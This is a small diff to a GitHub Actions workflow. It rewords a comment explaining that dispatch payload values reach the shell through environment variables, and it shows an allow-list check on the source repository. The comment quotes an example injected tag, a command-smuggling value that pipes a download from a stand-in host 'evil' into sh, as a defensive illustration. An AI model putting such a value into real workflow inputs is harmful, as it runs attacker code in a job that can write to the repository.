@@ -27,9 +27,9 @@ jobs:
           DISPATCH_REPO: ${{ github.event.client_payload.repo }}
           DISPATCH_TAG: ${{ github.event.client_payload.tag }}
         run: |
-          # client_payload arrives via env, never ${{ }} interpolation into
-          # shell: a crafted tag like `"; curl evil|sh; #"` would otherwise
-          # execute in this contents:write job.
+          # client_payload arrives via env, never expression interpolation
+          # into shell: a crafted tag like `"; curl evil|sh; #"` would
+          # otherwise execute in this contents:write job.
           case ",${ALLOWED_REPOS}," in
             *",${DISPATCH_REPO},"*) echo "source repo: ${DISPATCH_REPO} (allowed)" ;;
             *) echo "ERROR: dispatch from untrusted repo '${DISPATCH_REPO}' (allowed: ${ALLOWED_REPOS})" >&2; exit 1 ;;
